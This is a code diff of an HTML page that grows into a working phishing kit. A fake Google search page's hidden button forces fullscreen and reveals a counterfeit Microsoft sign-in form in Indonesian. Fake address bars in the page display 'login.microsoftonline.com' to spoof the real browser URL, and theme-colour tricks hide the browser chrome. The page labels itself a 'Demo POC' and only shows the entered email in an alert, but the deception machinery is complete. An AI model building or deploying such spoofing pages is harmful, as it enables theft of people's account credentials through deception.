@@ -1,17 +1,35 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Search - Google</title>
 <meta name="theme-color" content="#FFF9F5" id="theme-color-meta">
 <style>
-  body {
+  * {
     margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  
+  body {
     font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
     height: 100vh;
     display: flex;
     flex-direction: column;
     background-color: #FFF9F5;
+    transition: background 0.3s ease;
+  }
+  
+  /* Search Page Styles */
+  .search-page {
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+  }
+  
+  .search-page.hidden {
+    display: none;
   }
   
   header {
@@ -37,7 +55,6 @@
     box-sizing: border-box;
   }
   
-  /* Hidden fullscreen button positioned over search icon */
   .hidden-fullscreen-trigger {
     position: absolute;
     right: 8px;
@@ -77,6 +94,181 @@
     padding: 0 20px;
   }
   
+  /* Microsoft Login Page Styles */
+  .login-page {
+    display: none;
+    min-height: 100vh;
+    background: linear-gradient(135deg, #e6f2ff 0%, #f0e6ff 100%);
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  
+  .login-page.active {
+    display: flex;
+  }
+  
+  .login-container {
+    background: white;
+    border-radius: 2px;
+    box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+    width: 100%;
+    max-width: 440px;
+    padding: 44px;
+  }
+  
+  .ms-logo {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    margin-bottom: 20px;
+  }
+  
+  .ms-squares {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 2px;
+    width: 21px;
+    height: 21px;
+  }
+  
+  .square {
+    width: 100%;
+    height: 100%;
+  }
+  
+  .square-red { background: #f25022; }
+  .square-green { background: #7fba00; }
+  .square-blue { background: #00a4ef; }
+  .square-yellow { background: #ffb900; }
+  
+  .ms-text {
+    font-size: 15px;
+    font-weight: 600;
+    color: #5e5e5e;
+  }
+  
+  h1 {
+    font-size: 24px;
+    font-weight: 600;
+    color: #1b1b1b;
+    margin-bottom: 12px;
+    margin-top: 8px;
+  }
+  
+  .input-group {
+    margin-bottom: 20px;
+  }
+  
+  label {
+    display: block;
+    font-size: 13px;
+    color: #1b1b1b;
+    margin-bottom: 6px;
+  }
+  
+  input[type="email"],
+  input[type="password"] {
+    width: 100%;
+    padding: 8px 10px;
+    font-size: 15px;
+    border: 1px solid #8a8886;
+    border-radius: 0;
+    outline: none;
+    font-family: "Segoe UI", sans-serif;
+    background: white;
+  }
+  
+  input[type="email"]:focus,
+  input[type="password"]:focus {
+    border: 1px solid #0078d4;
+    border-bottom: 2px solid #0078d4;
+    padding-bottom: 7px;
+  }
+  
+  .links {
+    font-size: 13px;
+    margin-bottom: 24px;
+  }
+  
+  .links a {
+    color: #0067b8;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 12px;
+  }
+  
+  .links a:hover {
+    text-decoration: underline;
+  }
+  
+  .btn-primary {
+    background: #0067b8;
+    color: white;
+    border: none;
+    padding: 8px 12px;
+    font-size: 15px;
+    cursor: pointer;
+    float: right;
+    min-width: 108px;
+    font-weight: 600;
+    transition: background 0.2s;
+  }
+  
+  .btn-primary:hover {
+    background: #005a9e;
+  }
+  
+  .btn-primary:active {
+    background: #004578;
+  }
+  
+  .clearfix::after {
+    content: "";
+    display: table;
+    clear: both;
+  }
+  
+  .footer-links {
+    margin-top: 32px;
+    padding-top: 20px;
+    border-top: 1px solid #e1dfdd;
+  }
+  
+  .footer-links a {
+    color: #616161;
+    font-size: 11px;
+    text-decoration: none;
+    display: inline-block;
+    margin-right: 20px;
+    margin-bottom: 8px;
+  }
+  
+  .footer-links a:hover {
+    text-decoration: underline;
+  }
+  
+  .sign-in-options {
+    margin-top: 16px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+    color: #0067b8;
+    font-size: 13px;
+    width: fit-content;
+  }
+  
+  .sign-in-options:hover {
+    text-decoration: underline;
+  }
+  
+  .icon-key {
+    width: 16px;
+    height: 16px;
+  }
+  
+  /* Fake URL Bars */
   .fake-bar {
     background: #1c1c1e;
     position: fixed;
@@ -177,7 +369,6 @@
     visibility: visible;
   }
   
-  /* Fake address bar at top when in fullscreen */
   .fake-top-bar {
     background: #1c1c1e;
     position: fixed;
@@ -249,7 +440,7 @@
         <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
       </svg>
     </div>
-    <div class="fake-url">www.google.com/search</div>
+    <div class="fake-url" id="topFakeUrl">www.google.com/search</div>
     <div class="tab-count">1</div>
     <div class="user-icon">
       <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -265,23 +456,6 @@
     </div>
   </div>
 </div>
-
-<header>
-  <div class="search-container">
-    <input type="text" placeholder="Search Google..." id="myInput" />
-    <button class="hidden-fullscreen-trigger" id="searchBtn" title="Search">
-      <svg class="search-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
-        <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
-      </svg>
-    </button>
-  </div>
-</header>
-
-<main>
-  <div class="instruction">
-    👆 Click the search icon to continue
-  </div>
-</main>
 
 <!-- Fake address bar at bottom (visible above keyboard) -->
 <div class="fake-bar" id="fakeBar">
@@ -291,7 +465,7 @@
         <path d="M6 1C4.9 1 4 1.9 4 3v1H3v6h6V4H8V3c0-1.1-.9-2-2-2zm0 1c.6 0 1 .4 1 1v1H5V3c0-.6.4-1 1-1z"/>
       </svg>
     </div>
-    <div class="fake-url">www.google.com/search</div>
+    <div class="fake-url" id="bottomFakeUrl">www.google.com/search</div>
     <div class="tab-count">1</div>
     <div class="user-icon">
       <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
@@ -308,14 +482,84 @@
   </div>
 </div>
 
+<!-- Search Page -->
+<div class="search-page" id="searchPage">
+  <header>
+    <div class="search-container">
+      <input type="text" placeholder="Search Google..." id="searchInput" />
+      <button class="hidden-fullscreen-trigger" id="searchBtn" title="Search">
+        <svg class="search-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/>
+        </svg>
+      </button>
+    </div>
+  </header>
+  <main>
+    <div class="instruction">
+      👆 Click the search icon to continue
+    </div>
+  </main>
+</div>
+
+<!-- Microsoft Login Page -->
+<div class="login-page" id="loginPage">
+  <div class="login-container">
+    <div class="ms-logo">
+      <div class="ms-squares">
+        <div class="square square-red"></div>
+        <div class="square square-green"></div>
+        <div class="square square-blue"></div>
+        <div class="square square-yellow"></div>
+      </div>
+      <span class="ms-text">Microsoft</span>
+    </div>
+    
+    <h1>Masuk</h1>
+    
+    <div class="input-group">
+      <label for="email">Alamat email, nomor telepon, atau Skype</label>
+      <input type="email" id="email" autocomplete="username">
+    </div>
+    
+    <div class="links">
+      <a href="#">Belum punya akun? Buat sekarang!</a>
+      <a href="#">Tidak dapat mengakses akun Anda?</a>
+    </div>
+    
+    <div class="clearfix">
+      <button class="btn-primary" id="nextBtn">Selanjutnya</button>
+    </div>
+    
+    <div class="sign-in-options">
+      <svg class="icon-key" viewBox="0 0 16 16" fill="currentColor">
+        <path d="M8 1C5.8 1 4 2.8 4 5c0 1.3.6 2.4 1.6 3.1L4 11h1v2h2v-2h1l1.4-1.4c.7.3 1.4.4 2.1.4 2.2 0 4-1.8 4-4s-1.8-4-4-4zm3.5 5.5c-.6 0-1-.4-1-1s.4-1 1-1 1 .4 1 1-.4 1-1 1z"/>
+      </svg>
+      <span>Opsi masuk</span>
+    </div>
+    
+    <div class="footer-links">
+      <a href="#">Ketentuan penggunaan</a>
+      <a href="#">Privasi & cookie</a>
+      <a href="#">...</a>
+    </div>
+  </div>
+</div>
+
 <script>
 const fakeBar = document.getElementById('fakeBar');
 const fakeTopBar = document.getElementById('fakeTopBar');
-const input = document.getElementById('myInput');
+const searchInput = document.getElementById('searchInput');
+const emailInput = document.getElementById('email');
 const metaTheme = document.getElementById('theme-color-meta');
 const searchBtn = document.getElementById('searchBtn');
+const nextBtn = document.getElementById('nextBtn');
 const loadingOverlay = document.getElementById('loadingOverlay');
+const searchPage = document.getElementById('searchPage');
+const loginPage = document.getElementById('loginPage');
+const topFakeUrl = document.getElementById('topFakeUrl');
+const bottomFakeUrl = document.getElementById('bottomFakeUrl');
 let isFullscreen = false;
+let currentPage = 'search';
 
 // Fullscreen functions
 function enterFullscreen() {
@@ -343,7 +587,26 @@ function exitFullscreen() {
   }
 }
 
-// Handle search button click (hidden fullscreen trigger)
+// Switch to login page
+function showLoginPage() {
+  searchPage.classList.add('hidden');
+  loginPage.classList.add('active');
+  currentPage = 'login';
+  
+  // Update fake URLs
+  topFakeUrl.textContent = 'login.microsoftonline.com';
+  bottomFakeUrl.textContent = 'login.microsoftonline.com';
+  
+  // Update theme color
+  changeTabColor('#ffffff');
+  
+  // Auto focus email input
+  setTimeout(() => {
+    emailInput.focus();
+  }, 300);
+}
+
+// Handle search button click
 searchBtn.addEventListener('click', (e) => {
   e.preventDefault();
   
@@ -353,9 +616,10 @@ searchBtn.addEventListener('click', (e) => {
   // Enter fullscreen
   enterFullscreen();
   
-  // Redirect after a short delay
+  // Switch to login page after delay
   setTimeout(() => {
-    window.location.href = 'loginmsf.html';
+    loadingOverlay.classList.remove('active');
+    showLoginPage();
   }, 800);
 });
 
@@ -406,7 +670,8 @@ function adjustFakeBar() {
   }
 }
 
-input.addEventListener('focus', () => {
+// Search input focus handlers
+searchInput.addEventListener('focus', () => {
   setTimeout(() => changeTabColor('#000000'), 100);
   setTimeout(() => changeTabColor('#ffffff'), 500);
   setTimeout(() => {
@@ -415,15 +680,40 @@ input.addEventListener('focus', () => {
   }, 600);
 });
 
-input.addEventListener('blur', () => {
+searchInput.addEventListener('blur', () => {
   hideFakeBar();
   changeTabColor('#FFF9F5');
+});
+
+// Email input focus handlers
+emailInput.addEventListener('focus', () => {
+  setTimeout(() => changeTabColor('#1c1c1e'), 100);
+  setTimeout(() => {
+    showFakeBar();
+    adjustFakeBar();
+  }, 200);
+});
+
+emailInput.addEventListener('blur', () => {
+  setTimeout(() => {
+    hideFakeBar();
+    changeTabColor('#ffffff');
+  }, 100);
 });
 
 if (window.visualViewport) {
   window.visualViewport.addEventListener('resize', adjustFakeBar);
 }
 window.addEventListener('orientationchange', adjustFakeBar);
+
+// Handle next button
+nextBtn.addEventListener('click', (e) => {
+  e.preventDefault();
+  const email = emailInput.value;
+  if (email) {
+    alert('Demo POC - Email captured: ' + email);
+  }
+});
 </script>
 </body>
 </html>
